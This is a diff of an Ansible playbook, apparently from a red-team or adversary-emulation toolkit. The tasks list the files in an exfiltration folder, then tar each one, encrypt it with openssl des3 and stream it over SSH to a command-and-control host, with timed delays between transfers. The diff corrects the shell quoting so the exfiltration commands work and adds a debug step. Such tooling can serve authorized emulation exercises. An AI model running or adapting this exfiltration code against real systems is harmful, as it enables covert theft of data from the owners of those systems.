@@ -17,14 +17,15 @@
       
     - name: Grab files names form exfiltration_folder
       tags: SSH
-      shell: "find . -maxdepth 1 -type f | cut -d'/' -f2"
+      shell: find . -maxdepth 1 -type f | cut -d'/' -f2
       args:
         chdir: "{{ exfiltration_folder }}"
       register: exfil_files
-
+    - debug:
+        var: exfil_files
     - shell: |
-        "tar czpf - {{ item }} | openssl des3 -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}-{{ item }}.tar.gz.enc'"
-        "sleep {{ exfil_delay }}"
+        tar czpf - {{ item }} | openssl des3 -salt -k {{ password_encryption }} | ssh {{ cnc_fqdn }} 'cat > {{ exfiltration_file }}-{{ item }}.tar.gz.enc'
+        sleep {{ exfil_delay }}
       args:
         chdir: "{{ exfiltration_folder }}"
       with_items: "{{ exfil_files.stdout_lines }}"
